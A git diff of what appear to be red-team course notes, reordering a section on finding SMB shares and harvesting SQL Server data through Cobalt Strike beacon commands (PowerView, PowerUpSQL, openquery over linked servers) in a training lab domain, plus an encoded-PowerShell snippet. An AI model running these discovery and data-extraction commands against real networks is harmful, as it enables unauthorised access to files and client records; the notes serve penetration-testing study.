@@ -15,84 +15,12 @@ ___
 
 ## Description:  
 
-### Find File Shares
-
-`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to.
+### Useful Commands
 
 ```
-beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
+whoami /ALL
 
-Name     Type Remark              ComputerName      
-----     ---- ------              ------------      
-data$       0                     dc-1.cyberbotic.io
 
-beacon> ls \\dc-1.cyberbotic.io\data$
-
- Size     Type    Last Modified         Name
- ----     ----    -------------         ----
- 17kb     fil     03/25/2021 12:54:11   63ec08038c04ac60dab340ee9569e690dataMar-25-2021.xlsx
- 214kb    fil     03/25/2021 13:02:53   Apple iPhone 8.ai
- 1mb      fil     03/25/2021 13:02:55   Boeing 787-8 DreamLiner Air Canada.ai
- 540kb    fil     03/25/2021 13:02:54   Caterpillar 345D L.ai
- 829kb    fil     03/25/2021 13:02:55   Ducati 1098R (2011).ai
- 895kb    fil     03/25/2021 13:02:55   Volkswagen Caddy Maxi (2020).ai
-```
-
-### Find Databases
-We reviewed multiple methods for executing SQL queries in the **MS SQL Servers** section, but they would not scale well for searching across dozens of instances. PowerUpSQL provides some additional cmdlets designed for data searching and extraction.
-
-One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names.
-
-```
-beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize
-
-Instance                     Database Column      Sample         
---------                     -------- ------      ------         
-srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
-srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
-srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
-srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
-srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil
-```
-
-This can only search the instances you have direct access to, it won't traverse any SQL links. To search over the links use `Get-SQLQuery`.
-
-```
-beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
-
-TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
-------------- ------------ ----------            ----------
-master        dbo          spt_fallback_db       BASE TABLE
-master        dbo          spt_fallback_dev      BASE TABLE
-master        dbo          spt_fallback_usg      BASE TABLE
-master        dbo          spt_values            VIEW      
-master        dbo          spt_monitor           BASE TABLE
-master        dbo          MSreplication_options BASE TABLE
-master        dbo          VIPClients            BASE TABLE
-```
-
-```
-beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"
-
-column_name
------------
-City
-Name
-OrgNumber
-Street
-VIPClientsID
-```
-
-```
-beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"
-
-OrgNumber  
----------  
-65618655299
-69838663099
-12289506999
-73723428599
-51766460299
 ```
 
 ### pscp
@@ -210,6 +138,86 @@ From bash:
 echo -n 'COMMAND' | iconv -f UTF8 -t UTF16LE| base64 -w 0
  
 powershell -e ‘COMMAND’
+```
+
+### Find File Shares
+
+`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to.
+
+```
+beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
+
+Name     Type Remark              ComputerName      
+----     ---- ------              ------------      
+data$       0                     dc-1.cyberbotic.io
+
+beacon> ls \\dc-1.cyberbotic.io\data$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 17kb     fil     03/25/2021 12:54:11   63ec08038c04ac60dab340ee9569e690dataMar-25-2021.xlsx
+ 214kb    fil     03/25/2021 13:02:53   Apple iPhone 8.ai
+ 1mb      fil     03/25/2021 13:02:55   Boeing 787-8 DreamLiner Air Canada.ai
+ 540kb    fil     03/25/2021 13:02:54   Caterpillar 345D L.ai
+ 829kb    fil     03/25/2021 13:02:55   Ducati 1098R (2011).ai
+ 895kb    fil     03/25/2021 13:02:55   Volkswagen Caddy Maxi (2020).ai
+```
+
+### Find Databases
+We reviewed multiple methods for executing SQL queries in the **MS SQL Servers** section, but they would not scale well for searching across dozens of instances. PowerUpSQL provides some additional cmdlets designed for data searching and extraction.
+
+One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names.
+
+```
+beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize
+
+Instance                     Database Column      Sample         
+--------                     -------- ------      ------         
+srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
+srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
+srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
+srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
+srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil
+```
+
+This can only search the instances you have direct access to, it won't traverse any SQL links. To search over the links use `Get-SQLQuery`.
+
+```
+beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
+
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
+------------- ------------ ----------            ----------
+master        dbo          spt_fallback_db       BASE TABLE
+master        dbo          spt_fallback_dev      BASE TABLE
+master        dbo          spt_fallback_usg      BASE TABLE
+master        dbo          spt_values            VIEW      
+master        dbo          spt_monitor           BASE TABLE
+master        dbo          MSreplication_options BASE TABLE
+master        dbo          VIPClients            BASE TABLE
+```
+
+```
+beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"
+
+column_name
+-----------
+City
+Name
+OrgNumber
+Street
+VIPClientsID
+```
+
+```
+beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"
+
+OrgNumber  
+---------  
+65618655299
+69838663099
+12289506999
+73723428599
+51766460299
 ```
 
 ___
